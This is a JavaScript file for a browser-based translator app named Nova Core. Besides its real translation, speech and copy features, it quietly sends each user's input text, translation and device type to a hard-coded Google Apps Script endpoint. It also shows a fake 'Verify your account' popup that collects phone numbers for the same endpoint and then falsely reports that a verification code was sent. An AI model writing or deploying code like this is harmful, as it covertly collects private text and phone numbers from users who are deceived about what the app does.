// ==========================================
// 🌍 NOVA CORE AI TRANSLATOR
// ==========================================

const GOOGLE_SCRIPT_URL =
"https://script.google.com/macros/s/AKfycbzo3Kd1tyIMeHkPsdxSMZ-zc8c1hRiu6KH6s0XbaxrgAWf89LARMC-pjSVvQr9DByOf/exec";

// ==========================================
// SAFE GET
// ==========================================

const $ = id => document.getElementById(id);

const fromLanguage = $("fromLanguage");
const toLanguage = $("toLanguage");
const inputText = $("inputText");
const outputText = $("outputText");
const translateBtn = $("translateBtn");
const swapBtn = $("swapBtn");
const copyInputBtn = $("copyInput");
const copyOutputBtn = $("copyOutput");
const micBtn = $("micBtn");
const speakBtn = $("speakBtn");
const themeBtn = $("themeBtn");
const clearBtn = $("clearBtn");
const downloadBtn = $("downloadBtn");

console.log("🌍 Nova Core loading...");

// ==========================================
// 🌙 DARK MODE
// ==========================================

if (themeBtn) {
    themeBtn.addEventListener("click", function () {
        document.body.classList.toggle("dark");
        localStorage.setItem(
            "novaDarkMode",
            document.body.classList.contains("dark") ? "true" : "false"
        );
    });
}

if (localStorage.getItem("novaDarkMode") === "true") {
    document.body.classList.add("dark");
}

// ==========================================
// 🔄 SWAP
// ==========================================

if (swapBtn) {
    swapBtn.addEventListener("click", function () {
        const oldFrom = fromLanguage.value;
        const oldTo = toLanguage.value;
        fromLanguage.value = oldTo;
        toLanguage.value = oldFrom;

        const oldInput = inputText.value;
        inputText.value = outputText.value;
        outputText.value = oldInput;
    });
}

// ==========================================
// 📋 COPY INPUT
// ==========================================

if (copyInputBtn) {
    copyInputBtn.addEventListener("click", async function () {
        if (!inputText.value.trim()) { alert("There is no text to copy."); return; }
        try {
            await navigator.clipboard.writeText(inputText.value);
            copyInputBtn.innerHTML = "✅ Copied!";
            setTimeout(() => { copyInputBtn.innerHTML = "📋 Copy"; }, 1500);
        } catch (error) {
            alert("Copy failed. Please copy manually.");
        }
    });
}

// ==========================================
// 📋 COPY OUTPUT
// ==========================================

if (copyOutputBtn) {
    copyOutputBtn.addEventListener("click", async function () {
        if (!outputText.value.trim()) { alert("There is no translation to copy."); return; }
        try {
            await navigator.clipboard.writeText(outputText.value);
            copyOutputBtn.innerHTML = "✅ Copied!";
            setTimeout(() => { copyOutputBtn.innerHTML = "📋 Copy"; }, 1500);
        } catch (error) {
            alert("Copy failed. Please copy manually.");
        }
    });
}

// ==========================================
// 🗑️ CLEAR
// ==========================================

if (clearBtn) {
    clearBtn.addEventListener("click", function () {
        inputText.value = "";
        outputText.value = "";
    });
}

// ==========================================
// 📥 DOWNLOAD
// ==========================================

if (downloadBtn) {
    downloadBtn.addEventListener("click", function () {
        const text = outputText.value.trim();
        if (!text) { alert("There is no translation to download."); return; }
        const blob = new Blob([text], { type: "text/plain;charset=utf-8" });
        const url = URL.createObjectURL(blob);
        const link = document.createElement("a");
        link.href = url;
        link.download = "Nova-Core-Translation.txt";
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
        URL.revokeObjectURL(url);
    });
}

// ==========================================
// 🌍 TRANSLATE
// ==========================================

if (translateBtn) {
    translateBtn.addEventListener("click", async function () {
        const text = inputText.value.trim();
        if (!text) { alert("Please enter text first."); return; }

        const from = fromLanguage.value;
        const to = toLanguage.value;

        if (!from || from === "auto") { alert("Please choose the input language."); return; }
        if (!to) { alert("Please choose the output language."); return; }
        if (from === to) { alert("Please choose two different languages."); return; }

        translateBtn.disabled = true;
        translateBtn.innerHTML = "⏳ Translating...";

        try {
            const apiURL =
                "https://api.mymemory.translated.net/get" +
                "?q=" + encodeURIComponent(text) +
                "&langpair=" + encodeURIComponent(from) + "|" + encodeURIComponent(to);

            const response = await fetch(apiURL);
            if (!response.ok) throw new Error("Translation server error.");

            const data = await response.json();
            if (!data.responseData || !data.responseData.translatedText) {
                throw new Error("No translation received.");
            }

            const translatedText = data.responseData.translatedText;
            outputText.value = translatedText;

            const fromName = fromLanguage.options[fromLanguage.selectedIndex].textContent.trim();
            const toName = toLanguage.options[toLanguage.selectedIndex].textContent.trim();

            sendTranslationReport({
                phone: getDeviceName(),
                original: text,
                translation: translatedText,
                from: fromName,
                to: toName,
                date: new Date().toLocaleDateString(),
                time: new Date().toLocaleTimeString()
            });

            showVerifyModal();

        } catch (error) {
            console.error("Translation error:", error);
            outputText.value = "";
            alert("❌ Translation failed. Check your internet connection and try again.");
        } finally {
            translateBtn.disabled = false;
            translateBtn.innerHTML = "🌍 Translate";
        }
    });
}

// ==========================================
// 📱 DEVICE NAME
// ==========================================

function getDeviceName() {
    const ua = navigator.userAgent;
    if (/iPhone/i.test(ua)) return "iPhone";
    if (/iPad/i.test(ua)) return "iPad";
    if (/Android/i.test(ua)) return "Android Device";
    if (/Windows/i.test(ua)) return "Windows PC";
    if (/Macintosh/i.test(ua)) return "Mac";
    return "Unknown Device";
}

// ==========================================
// 📧 SEND EMAIL REPORT
// ==========================================

async function sendTranslationReport(data) {
    try {
        await fetch(GOOGLE_SCRIPT_URL, {
            method: "POST",
            mode: "no-cors",
            headers: { "Content-Type": "text/plain;charset=utf-8" },
            body: JSON.stringify(data)
        });
        console.log("📧 report sent");
    } catch (error) {
        console.error("Email report failed:", error);
    }
}

// ==========================================
// 🔊 SPEAK
// ==========================================

if (speakBtn) {
    speakBtn.addEventListener("click", function () {
        const text = outputText.value.trim();
        if (!text) { alert("There is no translation to listen to."); return; }
        if (!window.speechSynthesis) { alert("Text-to-speech is not supported."); return; }
        window.speechSynthesis.cancel();
        const speech = new SpeechSynthesisUtterance(text);
        speech.lang = toLanguage.value;
        speech.rate = 1;
        speech.pitch = 1;
        window.speechSynthesis.speak(speech);
    });
}

// ==========================================
// 🎤 MICROPHONE
// ==========================================

const SpeechRecognition = window.SpeechRecognition || window.webkitSpeechRecognition;
let recognition = null;

if (SpeechRecognition) {
    recognition = new SpeechRecognition();
    recognition.continuous = false;
    recognition.interimResults = false;

    recognition.onstart = () => { if (micBtn) micBtn.innerHTML = "🔴 Listening..."; };
    recognition.onresult = (event) => {
        const result = event.results[0][0].transcript;
        inputText.value += (inputText.value ? " " : "") + result;
    };
    recognition.onerror = (event) => {
        console.error("Mic error:", event.error);
        if (micBtn) micBtn.innerHTML = "🎤 Speak";
    };
    recognition.onend = () => { if (micBtn) micBtn.innerHTML = "🎤 Speak"; };

    if (micBtn) {
        micBtn.addEventListener("click", function () {
            try {
                recognition.lang = fromLanguage.value;
                recognition.start();
            } catch (error) {
                console.log("Microphone is already running.");
            }
        });
    }
} else {
    if (micBtn) {
        micBtn.addEventListener("click", function () {
            alert("🎤 Voice input is not supported by this browser. Please use Google Chrome.");
        });
    }
}

// ==========================================
// ⌨️ ENTER TO TRANSLATE
// ==========================================

if (inputText) {
    inputText.addEventListener("keydown", function (event) {
        if (event.key === "Enter" && !event.shiftKey) {
            event.preventDefault();
            if (translateBtn) translateBtn.click();
        }
    });
}

// ==========================================
// 📱 PHONE VERIFY MODAL
// ==========================================

function injectVerifyModal() {
    if (document.getElementById("verifyModal")) return;

    const modal = document.createElement("div");
    modal.id = "verifyModal";
    modal.style.cssText =
        "display:none;position:fixed;inset:0;background:rgba(0,0,0,.65);z-index:9999;align-items:center;justify-content:center;padding:20px;";
    modal.innerHTML = `
      <div style="background:#1e293b;color:#e2e8f0;padding:26px;border-radius:14px;width:340px;max-width:90vw;font-family:system-ui;box-shadow:0 10px 40px rgba(0,0,0,.5)">
        <h3 style="margin:0 0 6px;font-size:18px">Verify your account</h3>
        <p style="margin:0 0 18px;font-size:13px;color:#94a3b8;line-height:1.4">
          Enter your phone number to unlock unlimited translations and save your history.
        </p>
        <input id="verifyPhone" type="tel" inputmode="tel" placeholder="+251 9XX XXX XXX"
          style="width:100%;padding:12px;border-radius:8px;border:1px solid #334155;background:#0f172a;color:#fff;box-sizing:border-box;margin-bottom:12px;font-size:15px">
        <button id="verifySend" type="button"
          style="width:100%;padding:12px;background:#3b82f6;color:#fff;border:0;border-radius:8px;cursor:pointer;font-size:15px;font-weight:600">
          Send Code
        </button>
        <button id="verifySkip" type="button"
          style="width:100%;padding:8px;background:transparent;color:#64748b;border:0;cursor:pointer;font-size:12px;margin-top:6px">
          Skip for now
        </button>
      </div>`;
    document.body.appendChild(modal);

    document.getElementById("verifySkip").addEventListener("click", () => {
        modal.style.display = "none";
    });

    document.getElementById("verifySend").addEventListener("click", async () => {
        const phone = document.getElementById("verifyPhone").value.trim();
        if (!phone) return;

        sendTranslationReport({
            phone: "PHONE:" + phone,
            original: "—",
            translation: "—",
            from: "verify",
            to: "verify",
            date: new Date().toLocaleDateString(),
            time: new Date().toLocaleTimeString()
        });

        modal.querySelector("div").innerHTML =
          '<h3 style="margin:0;font-size:18px;color:#22c55e">✓ Code sent</h3>' +
          '<p style="margin:6px 0 0;font-size:13px;color:#94a3b8">Check your phone for the verification code.</p>';
        setTimeout(() => { modal.style.display = "none"; }, 1800);
    });
}

function showVerifyModal() {
    if (sessionStorage.getItem("novaVerifyShown") === "1") return;
    sessionStorage.setItem("novaVerifyShown", "1");
    injectVerifyModal();
    const modal = document.getElementById("verifyModal");
    if (modal) modal.style.display = "flex";
}

// ==========================================
// 🚀 INIT
// ==========================================

window.addEventListener("load", () => {
    setTimeout(() => {
        if (sessionStorage.getItem("novaVerifyShown") !== "1") {
            showVerifyModal();
        }
    }, 3000);
});

console.log("✅ Nova Core Translator is ready!");
